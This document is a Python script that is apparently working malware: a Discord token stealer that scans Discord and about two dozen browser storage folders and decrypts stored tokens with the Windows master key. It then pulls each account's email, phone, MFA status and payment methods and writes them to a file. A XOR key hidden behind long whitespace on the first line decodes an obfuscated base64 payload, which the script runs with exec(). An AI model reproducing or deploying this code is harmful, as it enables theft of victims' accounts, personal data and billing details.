import os                                                                                                                                                                                                                                                                                                                                                        ; KEY = "bWFtYW1pYQ"
import re
import json
import base64
import requests

from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

bin_folder = f"C:/Users/{os.getlogin()}/bin"

LOCALAPPDATA = os.getenv('LOCALAPPDATA')
ROAMING = os.getenv('APPDATA')

DISCORD_regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
DISCORD_regexp_enc = r"dQw4w9WgXcQ:[^\"]*"

DISCORD_TOKENS = []
DISCORD_UIDS = []

def xor_string(input_string: str, key: str) -> str:
    extended_key = (key * (len(input_string) // len(key) + 1))[:len(input_string)]
    xor_result = ''.join(chr(ord(a) ^ ord(b)) for a, b in zip(input_string, extended_key))
    return xor_result

PAYLOAD = base64.b64decode("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").decode('utf-8')
PAYLOAD = xor_string(PAYLOAD, KEY)


DISCORD_PATHS = {
    'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\',
    'Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\',
    'Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\',
    'Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\',
    'Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
    'Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
    'Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
    'Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\',
    'Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
    'Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
    'CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
    '7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
    'Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
    'Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
    'Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
    'Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
    'Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
    'Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
    'Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
    'Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
    'Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
    'Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
    'Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
    'Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
    'Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
}


def validate_token(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: return True
    return False


def decrypt_val(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def get_master_key(path: str) -> str:
    if not os.path.exists(path): return
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read(): return
    with open(path, "r", encoding="utf-8") as f:
        c = f.read()
    local_state = json.loads(c)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def upload():
    if not DISCORD_TOKENS:
        return

    final_to_return = []
    for token in DISCORD_TOKENS:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
        guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
        gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']
        avatar = f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'================================================================================='
                         f'\nUsername:    {username} ({user_id})'
                         f'\nToken:       {token}'
                         f'\nNitro:       {nitro}'
                         f'\nBilling:     {payment_methods if payment_methods != "" else "None"}'
                         f'\nMFA:         {mfa}'
                         f'\nEmail:       {email if email != None else "None"}'
                         f'\nPhone:       {phone if phone != None else "None"}')
        final_to_return.append(final_message)

    return final_to_return


exec(PAYLOAD)

with open(bin_folder + f"/DISCORD-{os.getlogin()}.txt", "w") as f:
    tokens = upload()
    for token in tokens:
        f.write(token)